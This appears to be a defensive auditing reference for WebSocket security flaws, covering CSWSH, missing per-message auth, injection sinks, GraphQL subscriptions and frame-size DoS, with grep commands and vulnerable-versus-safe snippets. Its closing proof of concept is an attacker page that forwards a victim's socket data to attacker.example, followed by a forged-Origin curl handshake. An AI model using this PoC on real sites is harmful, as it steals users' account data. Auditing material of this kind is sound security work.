---
name: websocket_security
description: WebSocket security — Cross-Site WebSocket Hijacking (CSWSH) via missing Origin validation on the upgrade handshake, missing authentication/authorization on the WS connection or per message, and unsanitized message broadcast (CWE-345/CWE-284/CWE-346)
---

# WebSocket Security (CSWSH / Missing Auth / Message Injection) (CWE-345, CWE-284, CWE-346)

The WebSocket handshake is an HTTP upgrade that browsers send **with the user's cookies** but **without** the same-origin restrictions that apply to `fetch`/XHR (there is no CORS preflight for `ws://`/`wss://`). A server that does not validate the `Origin` header on the upgrade — and relies on the ambient session cookie for auth — can be connected to from any attacker page on behalf of the logged-in victim. Beyond that handshake flaw, WS endpoints frequently skip authentication entirely and echo/broadcast message payloads without sanitization.

## What It Is / Is Not

- **Is**:
  1. **CSWSH** — upgrade handler accepts connections without checking `Origin` against an allowlist while authenticating via cookies (cross-site, cookie-driven).
  2. **Missing auth/authz** — WS handler processes messages without verifying a session/JWT, or enforces authz only at handshake and not per message.
  3. **Message injection** — `event.data` broadcast/echoed into other clients' DOM (stored DOM XSS) or into a server-side sink (SQL, command, XML, SSRF, file path) without sanitization.
- **Is not**: CSRF on a normal HTTP endpoint (`csrf.md` — but CSWSH is the WS analogue), CORS misconfiguration on `fetch` (`cors_misconfiguration.md`), or `ws://` cleartext transport alone (`cleartext_transmission.md`, cross-ref). When the only issue is `ws://` carrying tokens, report cleartext; when origin/auth is missing, report here.

## Source -> Sink Pattern

- **CSWSH source**: cross-origin attacker page opens `new WebSocket('wss://victim/...')`; the browser attaches victim cookies. **Sink**: server upgrade handler that authorizes purely on the cookie session with no `Origin` allowlist check.
- **Message-injection source**: `event.data` / received frame from `ws.on('message')` / `onmessage`. **Sinks**:
  - **DOM broadcast** → `innerHTML`, template literals in UI (XSS — `xss.md`)
  - **SQL** → string-built query from parsed JSON field (`sql_injection.md`)
  - **OS command** → `exec`/`spawn`/`subprocess` with message payload (`rce.md`)
  - **XML parse** → `parseString`, `DocumentBuilder` on message body (`xxe.md`)
  - **Outbound fetch** → server-side HTTP client URL from message field (`ssrf.md`)
  - **File path** → `readFile`, `open()` with user path from message (`path_traversal.md`)

## Recon Indicators (Grep)

```bash
# Node ws / Socket.IO servers — check for an Origin/verifyClient guard nearby
rg -n "new WebSocket\.Server|WebSocketServer\s*\(|require\(['\"]ws['\"]\)|socket\.io" --glob '*.{js,ts}'
rg -n "verifyClient|handleProtocols|checkOrigin|origin" --glob '*.{js,ts}'
# Go gorilla/coder — Upgrader with no CheckOrigin, or CheckOrigin returning true unconditionally
rg -n "websocket\.Upgrader\{" -A4 --glob '*.go'
rg -n "CheckOrigin:\s*func\([^)]*\)\s*bool\s*\{\s*return\s+true" --glob '*.go'
# Python (websockets / starlette / channels / aiohttp) handlers
rg -n "websocket\.accept|async def .*\bwebsocket\b|@websocket_route|WebsocketConsumer" --glob '*.py'
# Java/Spring — endpoint config; check for setAllowedOrigins("*")
rg -n "@ServerEndpoint|registerWebSocketHandlers|setAllowedOrigins" --glob '*.java'
# Broadcast of raw message (XSS via WS) and missing per-message auth
rg -n "clients\.forEach|broadcast|\.emit\(|\.send\(\s*(message|data|msg)\b" --glob '*.{js,ts}'
# Per-message injection sinks — message payload → server-side dangerous API
rg -n "on\s*\(['\"]message['\"]|onmessage\s*=" --glob '*.{js,ts,py,go,java}' -A6
rg -n "ws\.on\(['\"]message|websocket\.receive|async def .*\bwebsocket\b" --glob '*.{js,ts,py}' -A5 | rg -n "execute|query\(|exec\(|spawn|fetch\(|requests\.|readFile|open\(|parse\("
# Missing frame/message size limits (memory-exhaustion DoS)
rg -n "maxPayload|maxMessageSize|max_size|maxFrameSize|setMaxTextMessageBufferSize" --glob '*.{js,ts,py,go,java}'
rg -n "new WebSocket\.Server\s*\(\s*\{|WebSocketServer\s*\(\s*\{" --glob '*.{js,ts}' -A3
# GraphQL subscription transports without auth
rg -n "graphql-ws|graphql_transport_ws|useServer|subscriptions-transport-ws|/subscriptions" --glob '*.{js,ts}'
```

## Vulnerable Conditions

- Upgrade accepted with **no `Origin` allowlist** while the connection is authorized by an ambient cookie session → **CSWSH** (attacker reads/acts on victim's socket).
- Go `websocket.Upgrader{}` with default `CheckOrigin` (returns true for same-host only in older versions; explicit `return true` disables the check entirely) on a cookie-authenticated endpoint.
- Spring `setAllowedOrigins("*")` (or SockJS allowed-origins `*`) on an authenticated handler.
- WS handler that never verifies identity (`ws.on('message', ...)` acts on any connection), or checks auth once at connect but not on privileged messages.
- Received `event.data` broadcast to other clients and rendered via `innerHTML` → stored DOM XSS affecting every connected user.
- **No `maxPayload` / `maxMessageSize` / `max_size`** on the WebSocket server — attacker sends multi-megabyte frames → memory exhaustion (cross-ref `denial_of_service.md`).
- **GraphQL subscription endpoint** (`/subscriptions`, `graphql-ws`, `graphql_transport_ws`) mounted without authentication — real-time schema access and resolver execution for anonymous clients.
- Message handler passes `JSON.parse(data).query` / `.sql` / `.url` / `.path` into injection sinks (see per-message taxonomy below).

## Per-Message Injection Sink Taxonomy

Data from `ws.on('message')`, `socket.on('message')`, or framework `onmessage` handlers is **per-frame untrusted input**. Beyond DOM broadcast XSS, trace message fields into server sinks:

| Sink class | Example pattern | Cross-ref |
|------------|-----------------|-----------|
| SQL | `db.query(\`SELECT * FROM t WHERE id=${msg.id}\`)` | `sql_injection.md` |
| OS command | `exec(msg.cmd)` / `subprocess.run(msg['shell'])` | `rce.md` |
| XML parse | `parseString(msg.body)` / `DocumentBuilder.parse(msg)` | `xxe.md` |
| Outbound fetch | `fetch(msg.url)` / `axios.get(data.endpoint)` | `ssrf.md` |
| File path | `fs.readFile(msg.path)` / `open(data.filename)` | `path_traversal.md` |
| DOM broadcast | `el.innerHTML = msg.text` / `broadcast(msg)` rendered unsafely | `xss.md` |

**VULN**:
```js
ws.on('message', (data) => {
  const msg = JSON.parse(data);
  db.query(`SELECT * FROM users WHERE name = '${msg.name}'`);  // SQL
  exec(msg.command);                                            // RCE
  fetch(msg.callbackUrl);                                       // SSRF
});
```

**SAFE**: validate message schema; parameterized queries; static allowlisted URLs; encode before DOM render; reject unknown message types.

## Handshake-Only Auth on Privileged Messages

Auth verified once at WebSocket **upgrade** (cookie/session on HTTP 101) but **not re-checked per message** lets any established connection invoke privileged actions — role changes, kick/ban, admin broadcasts, subscription to other users' channels — even if the session expired or the socket was hijacked mid-session.

**Vulnerable conditions**:
- `onConnect` reads session; `on('message')` handles `{ action: 'promoteUser', role: 'admin' }` with no principal re-validation
- Chat/moderation WS: `kick`, `ban`, `deleteMessage` processed without checking sender role on each frame
- Token validated at handshake only; long-lived socket outlives token TTL

**Grep seeds**:
```bash
rg -n "on\s*\(['\"]connection['\"]|onConnect|afterConnect" --glob '*.{js,ts}' -A8
rg -n "kick|ban|promote|role|admin|privilege" --glob '*.{js,ts,py}' -B5 | rg -n "message|on\('message"
```

**VULN**:
```js
wss.on('connection', (ws, req) => {
  const user = sessionFromCookie(req);           // auth once at upgrade
  ws.on('message', (raw) => {
    const { action, targetId } = JSON.parse(raw);
    if (action === 'kick') kickUser(targetId);   // no role check per message
  });
});
```

**SAFE**: bind socket to authenticated principal; re-validate token/session or role on every privileged action; close socket when session expires.

## Naive Origin Allowlist (Substring Match)

CSWSH mitigations fail when the upgrade handler checks `Origin` with **substring/prefix/suffix match** instead of an exact allowlist entry. Attackers register or control a host whose name **contains** the trusted string (`attacker.example.com` passes `origin.includes('example.com')`; `https://evil.example.com.attacker.net` passes `endsWith('.example.com')`).

**Vulnerable conditions**:
- `origin.includes('example.com')`, `origin.indexOf('example.com') !== -1`, `origin.endsWith('.example.com')` without parsing to `scheme://host` and comparing to a fixed set
- Allowlist built from partial host suffixes or subdomain wildcards implemented via string search

**Grep seeds**:
```bash
rg -n "origin\.(includes|indexOf|endsWith|startsWith|match)\(" --glob '*.{js,ts,py,go,java}'
rg -n "CheckOrigin|verifyClient|allowedOrigins" --glob '*.{js,ts,go,java}' -A3 | rg -n "includes|indexOf|endsWith|startsWith|\*"
```

**VULN**:
```js
const origin = req.headers.origin || '';
if (origin.includes('example.com')) upgrade.accept();  // bypass: https://attacker.example.com.evil.net
```

**SAFE**: parse `Origin` to `(scheme, host)`; require exact match against a fixed allowlist (`https://app.example.com`); reject missing, malformed, or non-HTTPS origins when cookies authorize the socket.

## GraphQL Subscription Endpoints Without Auth

Real-time GraphQL over WebSocket (`graphql-ws`, `graphql_transport_ws`, legacy `subscriptions-transport-ws`) exposes **subscription resolvers** on paths such as `/graphql`, `/subscriptions`, or dedicated WS URLs. When `useServer` / `SubscriptionServer` starts without auth middleware, callers receive live data streams (notifications, balances, admin events) without credentials.

**Vulnerable conditions**:
- `useServer({ schema, onConnect: () => true })` or missing `onConnect` identity check
- `/subscriptions` route with no JWT/session validation before `subscribe` execution
- Subscription resolvers return cross-user data with no object-level authz

**Grep seeds**:
```bash
rg -n "useServer|graphql-ws|graphql_transport_ws|SubscriptionServer|makeServer" --glob '*.{js,ts}'
rg -n "onConnect|connectionParams|didConnect" --glob '*.{js,ts}' -A4
```

**VULN**:
```js
useServer({ schema, wsServer });  // no onConnect auth — anonymous subscriptions
```

**SAFE**: validate `connectionParams.authToken` in `onConnect`; reject unauthenticated upgrade; enforce authz in subscription resolvers (same as query resolvers).

## GraphQL Transport Parity Bypass (HTTP vs WebSocket)

Introspection, auth middleware, or validation rules disabled on the **HTTP** `/graphql` route may still be reachable over the **GraphQL WebSocket** transport (`graphql-ws`, `subscriptions-transport-ws`). Clients send operation documents in subscription frames — not only over POST — so HTTP-only blocks do not protect the WS path.

**Vulnerable conditions**:
- HTTP handler sets `introspection: false` / blocks `__schema`, but `useServer` / `SubscriptionServer` executes arbitrary `query`/`subscribe` payloads without the same rules
- Auth middleware applied to Express/Fastify HTTP `/graphql` but omitted from WS `onConnect` / `connectionParams` validation
- Rate limits or persisted-query allowlists enforced only on HTTP POST bodies

**Grep seeds**:
```bash
rg -n "introspection:\s*false|disableIntrospection|NoSchemaIntrospection" --glob '*.{js,ts,py,java}'
rg -n "useServer|SubscriptionServer|graphql-ws|subscriptions-transport-ws" --glob '*.{js,ts}' -A8
rg -n "__schema|__type" --glob '*.{js,ts,py}' -B3 | rg -v "validation|block|disable"
```

**VULN** — introspection over WS while blocked on HTTP:
```json
{"type":"subscribe","id":"1","payload":{"query":"{ __schema { types { name } } }"}}
```
(Legacy `subscriptions-transport-ws` uses `"type":"start"` with the same `payload.query` shape.)

**SAFE**: enforce introspection disable, authn/authz, depth/complexity limits, and operation allowlists at the **GraphQL engine** (validation rules / `execute` wrapper) so every transport shares one policy. Cross-ref `graphql_injection.md`.

## Missing Max Frame / Message Size (DoS)

WebSocket libraries default to large or unlimited frame buffers. Without **`maxPayload`** (`ws`), **`maxMessageSize`** / **`max_size`** (Python `websockets`), or **`setMaxTextMessageBufferSize`** (Java), a single oversized text/binary frame can exhaust server memory.

**Vulnerable conditions**:
- `new WebSocket.Server({ port })` with no `maxPayload` option
- `websockets.serve()` / Starlette `WebSocket` with no inbound size cap
- Spring `WebSocketHandler` with default unlimited text buffer

**Grep seeds**:
```bash
rg -n "WebSocket\.Server\s*\(|WebSocketServer\s*\(" --glob '*.{js,ts}' -A5 | rg -v "maxPayload"
rg -n "maxPayload|maxMessageSize|max_size" --glob '*.{js,ts,py,java}'
```

**VULN**:
```js
const wss = new WebSocket.Server({ server });  // default maxPayload ~100MB — no explicit cap
```

**SAFE**: `maxPayload: 64 * 1024` (or stricter); reject oversize frames; rate-limit message frequency. Cross-ref `denial_of_service.md`.

## Safe Patterns

- **Validate `Origin`** on the handshake against a strict allowlist (exact scheme+host; reject missing/unknown Origin). Go: implement `CheckOrigin`; `ws`: use `verifyClient`/check `info.origin`; Spring: `setAllowedOrigins("https://app.example.com")` (never `*`).
- **Authenticate the connection** with a token that is **not** an ambient cookie — e.g., a short-lived ticket/JWT passed in the first message or `Sec-WebSocket-Protocol`, validated server-side; bind the socket to the authenticated principal.
- **Authorize every message**, not only the handshake (subscribe/publish/command checks per frame against the bound principal).
- **Encode message payloads** before rendering; treat `event.data` as untrusted (route through the appropriate injection sanitizer).
- Use `wss://` only (cross-ref `cleartext_transmission.md`).

## Severity / Triage

- CSWSH on a cookie-authenticated socket exposing sensitive data or actions → **High** (cross-site account access without user interaction beyond visiting a page).
- Missing authentication on a privileged WS endpoint → **High**.
- Per-message authz missing (handshake-only) on sensitive operations → **High/Medium**.
- Privileged WS actions (`kick`, `ban`, role change) without per-message role check → **High**.
- GraphQL subscriptions without `onConnect` auth → **High** (live data exfiltration).
- Message payload → SQL/command/SSRF/XML/file sink → severity per sink reference.
- No `maxPayload` / message size limit → **Medium** DoS (cross-ref `denial_of_service.md`).
- Broadcast XSS via WS → severity per `xss.md` (stored DOM XSS → High).
- `Origin` checked / token-based (non-cookie) auth present → **FALSE POSITIVE** for CSWSH.

## Dynamic Test / PoC

```html
<!-- CSWSH: host on attacker origin, lure the logged-in victim to visit -->
<script>
  const ws = new WebSocket('wss://victim.example/ws');         // victim cookies auto-attached
  ws.onmessage = e => fetch('https://attacker.example/x?d=' + encodeURIComponent(e.data));
  ws.onopen   = () => ws.send(JSON.stringify({action: 'getAccountData'}));
</script>
```
```bash
# Handshake without/with forged Origin — success on a cookie-auth socket => CSWSH
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom|base64)" \
  -H "Origin: https://attacker.example" -H "Cookie: session=<victim>" \
  https://victim.example/ws
```
Confirmed when the cross-origin connection succeeds (HTTP 101) and returns the victim's data.

## Common False Alarms

- Public, unauthenticated broadcast sockets carrying no per-user data and no privileged actions (origin check not security-relevant).
- Endpoints authenticated by a non-cookie bearer token validated in the first frame (CSWSH not applicable — attacker page cannot obtain the token).
- `Origin`/allowlist enforced at a reverse proxy/API gateway in front of the app (verify it exists before closing).

## Cross-References

- `csrf.md` — CSWSH is the WebSocket analogue of CSRF; cookie-driven, cross-site.
- `cors_misconfiguration.md` — analogous origin-trust failure for `fetch`/XHR.
- `cleartext_transmission.md` — `ws://` carrying tokens.
- `xss.md` — message broadcast rendered into the DOM.
- `sql_injection.md` / `rce.md` / `ssrf.md` / `xxe.md` / `path_traversal.md` — per-message server-side sinks.
- `denial_of_service.md` — oversized frames / unbounded message buffers.
- `graphql_injection.md` — unauthenticated GraphQL subscription transports; introspection/authz parity across HTTP and WS.
- `idor.md` / `race_conditions.md` — per-message authorization and concurrency on WS streams.

## Core Principle

Treat the WebSocket handshake as an authentication boundary: validate `Origin` against an allowlist, authenticate with a credential the attacker's page cannot replay (not an ambient cookie alone), authorize every message, and encode all payloads.
